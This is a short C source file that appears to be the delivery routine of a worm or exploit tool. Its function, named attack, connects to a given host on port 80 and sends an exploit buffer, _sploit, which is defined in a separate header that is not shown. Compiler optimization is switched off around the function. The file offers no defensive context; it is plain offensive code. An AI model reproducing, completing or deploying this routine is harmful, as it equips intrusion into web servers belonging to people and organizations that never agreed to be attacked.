#pragma optimize("", off)

#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

void attack(char *hostname) {
    volatile struct _LocalCtx {
        SOCKET s;
        struct hostent *he;
        SOCKADDR_IN addr;
        int i;
    } ctx;

    ctx.s = socket(AF_INET, SOCK_STREAM, 0);
    if (ctx.s == INVALID_SOCKET) return;

    ctx.he = gethostbyname(hostname);
    if (!ctx.he) { closesocket(ctx.s); return; }

    memset(&ctx.addr, 0, sizeof(ctx.addr));
    ctx.addr.sin_family = AF_INET;
    ctx.addr.sin_addr.s_addr = *((unsigned long *)ctx.he->h_addr_list[0]);
    ctx.addr.sin_port = htons(80);

    ctx.i = connect(ctx.s, (struct sockaddr *)&ctx.addr, sizeof(ctx.addr));
    if (ctx.i != 0) { closesocket(ctx.s); return; }

    send(ctx.s, (const char *)_sploit, sizeof(_sploit), 0);
    closesocket(ctx.s);
}

#pragma optimize("", on)
